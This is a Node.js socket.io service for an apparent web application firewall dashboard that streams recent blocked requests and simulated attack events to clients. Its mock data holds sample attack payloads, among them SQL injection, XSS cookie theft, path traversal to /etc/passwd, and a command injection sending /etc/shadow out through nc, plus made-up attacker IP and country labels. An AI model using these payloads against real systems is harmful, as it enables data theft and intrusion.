// // server/src/services/socket.js

// 'use strict';

// const { Server } = require('socket.io');

// let io = null;

// function initSocket(httpServer, allowedOrigins) {
//     if (!allowedOrigins) allowedOrigins = ['http://localhost:3000'];

//     io = new Server(httpServer, {
//         cors: {
//             origin     : allowedOrigins,
//             methods    : ['GET', 'POST'],
//             credentials: true,
//         },
//         pingInterval: 25000,
//         pingTimeout : 60000,
//     });

//     io.on('connection', (socket) => {
//         console.log(`[Socket.io] Client connected: ${socket.id}`);

//         socket.emit('waf:connected', {
//             message  : 'Connected to ShieldWAF live feed',
//             timestamp: new Date().toISOString(),
//         });

//         socket.on('disconnect', (reason) => {
//             console.log(`[Socket.io] Disconnected: ${socket.id} (${reason})`);
//         });

//         socket.on('join:room', (room) => {
//             socket.join(room);
//         });
//     });

//     setInterval(() => {
//         if (io) io.emit('waf:heartbeat', { timestamp: new Date().toISOString() });
//     }, 30000);

//     console.log('[Socket.io] Live feed initialized');
//     return io;
// }

// function getIO() {
//     if (!io) throw new Error('[Socket.io] Not initialized. Call initSocket() first.');
//     return io;
// }

// function emitThreat(payload) {
//     try {
//         if (io) {
//             io.emit('waf:threat', {
//                 ...payload,
//                 timestamp: payload.timestamp || new Date().toISOString(),
//             });
//         }
//     } catch (err) {
//         console.error('[Socket.io] emitThreat failed:', err.message);
//     }
// }

// function emitBlock(payload) {
//     try {
//         if (io) {
//             io.emit('waf:blocked', {
//                 ...payload,
//                 timestamp: new Date().toISOString(),
//             });
//         }
//     } catch (err) {
//         console.error('[Socket.io] emitBlock failed:', err.message);
//     }
// }

// module.exports = { initSocket, getIO, emitThreat, emitBlock };






// PATH: server/src/services/socket.js
const { Server } = require('socket.io')
const Log = require('../models/Log')

let io = null

const MOCK_IPS = [
    { ip: '185.220.101.4', country: 'Russia', flag: '🇷🇺' },
    { ip: '103.21.244.0', country: 'China', flag: '🇨🇳' },
    { ip: '178.62.55.19', country: 'Germany', flag: '🇩🇪' },
    { ip: '104.21.19.81', country: 'Brazil', flag: '🇧🇷' },
    { ip: '5.188.10.51', country: 'Netherlands', flag: '🇳🇱' },
    { ip: '172.16.0.45', country: 'India', flag: '🇮🇳' },
    { ip: '45.155.205.4', country: 'Russia', flag: '🇷🇺' },
    { ip: '8.8.8.8', country: 'USA', flag: '🇺🇸' },
]

const MOCK_ATTACKS = [
    { attackType: 'SQL Injection', payload: "'; DROP TABLE users;--", action: 'blocked', method: 'POST' },
    { attackType: 'XSS', payload: '<script>alert(document.cookie)</script>', action: 'blocked', method: 'GET' },
    { attackType: 'Path Traversal', payload: '../../../etc/passwd', action: 'blocked', method: 'GET' },
    { attackType: 'Command Injection', payload: '; cat /etc/shadow | nc 10.0.0.1', action: 'blocked', method: 'POST' },
    { attackType: 'SSRF', payload: 'http://169.254.169.254/latest/meta-data', action: 'blocked', method: 'POST' },
    { attackType: 'SQL Injection', payload: '/api/products?search=laptop', action: 'allowed', method: 'GET' },
    { attackType: 'XSS', payload: '<img src=x onerror=alert(1)>', action: 'blocked', method: 'GET' },
    { attackType: 'Brute Force', payload: '/admin/login [multiple attempts]', action: 'blocked', method: 'POST' },
]

function randomFrom(arr) {
    return arr[Math.floor(Math.random() * arr.length)]
}

function nowTs() {
    const n = new Date()
    return `${String(n.getHours()).padStart(2, '0')}:${String(n.getMinutes()).padStart(2, '0')}:${String(n.getSeconds()).padStart(2, '0')}.${String(n.getMilliseconds()).padStart(3, '0')}`
}

function initSocket(httpServer) {
    io = new Server(httpServer, {
        cors: {
            origin: [
                process.env.CLIENT_URL || 'http://localhost:3000',
                'http://localhost:3001',
            ],
            methods: ['GET', 'POST'],
        },
    })

    io.on('connection', (socket) => {
        console.log(`🔌 Socket connected: ${socket.id}`)

        // Send last 10 real logs immediately on connect
        Log.find({ action: { $in: ['Blocked', 'Warning'] } })
            .sort({ timestamp: -1 })
            .limit(10)
            .lean()
            .then(logs => {
                const formatted = logs.map(l => ({
                    id: l._id.toString(),
                    timestamp: nowTs(),
                    ip: l.ip,
                    method: l.method,
                    payload: l.payload,
                    action: l.action.toLowerCase(),
                    attackType: l.attackType,
                    country: l.country,
                    flag: l.countryFlag,
                }))
                socket.emit('initial_feed', formatted)
            })
            .catch(() => { })

        socket.on('disconnect', () => {
            console.log(`🔌 Socket disconnected: ${socket.id}`)
        })
    })

    // Broadcast a simulated live event every 3.5 seconds
    setInterval(() => {
        if (!io) return
        const ipData = randomFrom(MOCK_IPS)
        const attack = randomFrom(MOCK_ATTACKS)
        const event = {
            id: Math.random().toString(36).slice(2),
            timestamp: nowTs(),
            ip: ipData.ip,
            country: ipData.country,
            flag: ipData.flag,
            method: attack.method,
            payload: attack.payload,
            action: attack.action,
            attackType: attack.attackType,
        }
        io.emit('new_attack', event)
    }, 3500)

    return io
}

function getIO() {
    return io
}

module.exports = { initSocket, getIO }